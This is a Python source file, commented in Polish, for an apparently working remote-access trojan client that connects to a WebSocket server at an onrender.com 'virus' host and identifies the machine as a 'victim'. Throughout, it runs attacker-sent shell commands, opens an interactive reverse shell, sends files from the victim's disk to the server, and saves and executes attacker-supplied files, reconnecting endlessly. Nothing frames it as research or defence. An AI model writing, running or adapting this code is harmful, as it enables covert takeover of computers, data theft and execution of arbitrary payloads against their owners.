import time
import os
import json
import socket
import subprocess
import platform
import tempfile
import threading
import select
import sys
import io

try:
    from websocket import create_connection, WebSocketConnectionClosedException
except ImportError:
    print("Brak biblioteki websocket-client. Instaluję...")
    os.system("pip install websocket-client")
    from websocket import create_connection, WebSocketConnectionClosedException

# ─── Konfiguracja ───────────────────────────────────────────────
SERVER_URL = "wss://virus-5.onrender.com/victim"
VICTIM_ID = f"{socket.gethostname()}-{platform.system()}"
RECONNECT_DELAY = 5
DOWNLOAD_DIR = tempfile.gettempdir()  # Folder na pobrane pliki
# ────────────────────────────────────────────────────────────────

# Bufor: po otrzymaniu JSON type=upload czekamy na następną wiadomość binarną
pending_upload_filename = None

# Interaktywny terminal
terminal_process = None
terminal_thread = None

# Lock na wysyłanie przez WebSocket (thread-safety)
ws_lock = threading.Lock()


def safe_ws_send(ws, data):
    """Thread-safe wysyłanie przez WebSocket."""
    with ws_lock:
        ws.send(data)


def handle_terminal_start(ws):
    """Uruchamia interaktywny shell i streamuje output do attackera."""
    global terminal_process, terminal_thread

    # Zamknij istniejący terminal jeśli jest
    handle_terminal_stop(ws)

    try:
        shell_cmd = "cmd.exe" if platform.system() == "Windows" else "/bin/bash"

        terminal_process = subprocess.Popen(
            shell_cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            shell=False,
            bufsize=0,
            cwd=os.path.expanduser("~")
        )

        safe_ws_send(ws, json.dumps({"type": "terminal_started", "shell": shell_cmd, "pid": terminal_process.pid}))
        print(f"  [⌨] Terminal uruchomiony: {shell_cmd} (PID {terminal_process.pid})")

        # Wątek czytający output z procesu i wysyłający do serwera
        def reader():
            global terminal_process
            proc = terminal_process
            try:
                # Używamy BufferedReader.read1() — czyta tyle ile jest DOSTĘPNE
                # w buforze, zamiast blokować do pełnych 4096 bajtów.
                # Na Windows read(4096) może blokować zbyt długo.
                buffered = io.BufferedReader(proc.stdout, buffer_size=4096)
                while proc and proc.poll() is None:
                    try:
                        data = buffered.read1(4096)
                    except (ValueError, OSError):
                        # Pipe zamknięty
                        break
                    if not data:
                        break
                    try:
                        text = data.decode("utf-8", errors="replace")
                        safe_ws_send(ws, json.dumps({"type": "terminal_output", "output": text}))
                    except Exception:
                        break
            except Exception as e:
                try:
                    safe_ws_send(ws, json.dumps({"type": "terminal_output", "output": f"\n[terminal zakończony: {e}]\n"}))
                except Exception:
                    pass
            finally:
                try:
                    safe_ws_send(ws, json.dumps({"type": "terminal_stopped"}))
                except Exception:
                    pass

        terminal_thread = threading.Thread(target=reader, daemon=True)
        terminal_thread.start()

    except Exception as e:
        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Nie można uruchomić terminala: {e}"}))


def handle_terminal_input(ws, data):
    """Wysyła input do uruchomionego terminala."""
    global terminal_process
    if terminal_process is None or terminal_process.poll() is not None:
        safe_ws_send(ws, json.dumps({"type": "error", "msg": "Terminal nie jest uruchomiony"}))
        return

    user_input = data.get("input", "")
    try:
        terminal_process.stdin.write((user_input + "\n").encode("utf-8"))
        terminal_process.stdin.flush()
    except Exception as e:
        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Błąd zapisu do terminala: {e}"}))


def handle_terminal_stop(ws):
    """Zamyka interaktywny terminal."""
    global terminal_process, terminal_thread
    if terminal_process is not None:
        try:
            terminal_process.terminate()
            terminal_process.wait(timeout=3)
        except Exception:
            try:
                terminal_process.kill()
            except Exception:
                pass
        terminal_process = None
        print("  [⌨] Terminal zamknięty")


def handle_shell(ws, data):
    """Wykonuje polecenie shell i odsyła wynik."""
    command = data.get("command", "")
    if not command:
        safe_ws_send(ws, json.dumps({"type": "shell_result", "output": "(puste polecenie)"}))
        return

    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            cwd=os.path.expanduser("~")
        )
        output = result.stdout + result.stderr
        if not output:
            output = "(brak wyjścia)"
    except subprocess.TimeoutExpired:
        output = "(timeout — polecenie trwało za długo)"
    except Exception as e:
        output = f"(błąd: {e})"

    safe_ws_send(ws, json.dumps({
        "type": "shell_result",
        "command": command,
        "output": output[:50000]  # limit żeby nie wysadzić WebSocket
    }))


def handle_upload(ws, data):
    """Przygotowuje odbiór pliku — właściwy plik przyjdzie jako binary."""
    global pending_upload_filename
    pending_upload_filename = data.get("filename", "uploaded_file.bin")
    safe_ws_send(ws, json.dumps({
        "type": "upload_ready",
        "filename": pending_upload_filename
    }))


def handle_binary(ws, raw_data):
    """Zapisuje otrzymane dane binarne jako plik."""
    global pending_upload_filename
    filename = pending_upload_filename or "received_file.bin"
    pending_upload_filename = None

    filepath = os.path.join(DOWNLOAD_DIR, filename)
    try:
        with open(filepath, "wb") as f:
            f.write(raw_data)
        msg = f"Zapisano plik: {filepath} ({len(raw_data)} bajtów)"
        print(f"  [✓] {msg}")
        safe_ws_send(ws, json.dumps({"type": "upload_done", "filepath": filepath, "size": len(raw_data)}))
    except Exception as e:
        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Nie można zapisać pliku: {e}"}))


def handle_download(ws, data):
    """Wysyła plik z dysku victima do serwera (→ attacker)."""
    filepath = data.get("filepath", "")
    if not filepath or not os.path.isfile(filepath):
        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Plik nie istnieje: {filepath}"}))
        return

    try:
        filesize = os.path.getsize(filepath)
        # Najpierw info JSON
        safe_ws_send(ws, json.dumps({
            "type": "download_start",
            "filepath": filepath,
            "size": filesize
        }))
        # Potem dane binarne
        with open(filepath, "rb") as f:
            with ws_lock:
                ws.send_binary(f.read())
        print(f"  [↑] Wysłano plik: {filepath} ({filesize} B)")
    except Exception as e:
        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Błąd odczytu pliku: {e}"}))


def handle_execute(ws, data):
    """Uruchamia plik na komputerze victima."""
    filepath = data.get("filepath", "")
    if not filepath or not os.path.isfile(filepath):
        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Plik nie istnieje: {filepath}"}))
        return

    try:
        # Nadaj uprawnienia na Linux/Mac
        if platform.system() != "Windows":
            os.chmod(filepath, 0o755)

        result = subprocess.run(
            filepath,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60
        )
        output = result.stdout + result.stderr
        if not output:
            output = "(brak wyjścia, kod: {})".format(result.returncode)

        safe_ws_send(ws, json.dumps({
            "type": "execute_result",
            "filepath": filepath,
            "output": output[:50000]
        }))
        print(f"  [▶] Wykonano: {filepath}")
    except subprocess.TimeoutExpired:
        safe_ws_send(ws, json.dumps({"type": "execute_result", "filepath": filepath, "output": "(timeout)"}))
    except Exception as e:
        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Błąd wykonania: {e}"}))


def connect_loop():
    """Łączy się z serwerem i nasłuchuje poleceń."""
    url = f"{SERVER_URL}?id={VICTIM_ID}"

    while True:
        try:
            print(f"[*] Łączenie z {url} ...")
            ws = create_connection(url)
            print(f"[+] Połączono jako '{VICTIM_ID}'")

            # Powitanie
            safe_ws_send(ws, json.dumps({
                "type": "hello",
                "id": VICTIM_ID,
                "os": platform.system(),
                "hostname": socket.gethostname(),
                "user": os.getenv("USER") or os.getenv("USERNAME", "?")
            }))

            while True:
                raw = ws.recv()
                if not raw:
                    break

                # Dane binarne (plik od attackera)
                if isinstance(raw, bytes):
                    handle_binary(ws, raw)
                    continue

                # JSON — polecenie
                try:
                    data = json.loads(raw)
                except json.JSONDecodeError:
                    continue

                msg_type = data.get("type", "")
                print(f"  [←] Polecenie: {msg_type}")

                if msg_type == "shell":
                    handle_shell(ws, data)
                elif msg_type == "upload":
                    handle_upload(ws, data)
                elif msg_type == "download":
                    handle_download(ws, data)
                elif msg_type == "execute":
                    handle_execute(ws, data)
                elif msg_type == "terminal_start":
                    handle_terminal_start(ws)
                elif msg_type == "terminal_input":
                    handle_terminal_input(ws, data)
                elif msg_type == "terminal_stop":
                    handle_terminal_stop(ws)
                else:
                    safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Nieznany typ: {msg_type}"}))

        except WebSocketConnectionClosedException:
            print("[!] Serwer zamknął połączenie")
        except ConnectionRefusedError:
            print("[!] Odmowa połączenia")
        except Exception as e:
            print(f"[!] Błąd: {e}")

        print(f"[*] Ponowna próba za {RECONNECT_DELAY}s ...")
        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    connect_loop()
